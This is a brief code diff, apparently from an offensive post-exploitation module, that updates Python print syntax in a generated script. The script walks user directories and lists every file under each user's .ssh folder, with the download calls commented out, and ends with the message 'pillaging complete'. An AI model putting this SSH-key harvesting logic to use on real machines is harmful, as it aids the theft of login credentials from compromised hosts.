@@ -130,7 +130,7 @@ else:
 for userPath in userPaths:
     for searchPath in searchPaths:
         #downloadFile(userPath + searchPath)
-        print userPath + searchPath
+        print(userPath + searchPath)
 
     # grab all .ssh files
     filePath = os.path.expanduser(userPath + '/.ssh/')
@@ -138,9 +138,9 @@ for userPath in userPaths:
         sshFiles = [f for f in os.listdir(filePath) if os.path.isfile(os.path.join(filePath, f))]
         for sshFile in sshFiles:
             # downloadFile(userPath + '/.ssh/' + sshFile)
-            print userPath + '/.ssh/' + sshFile
+            print(userPath + '/.ssh/' + sshFile)
 
-print "pillaging complete"
+print("pillaging complete")
 """ % {'sleep': sleep, 'allUsers': allUsers}
 
         return script
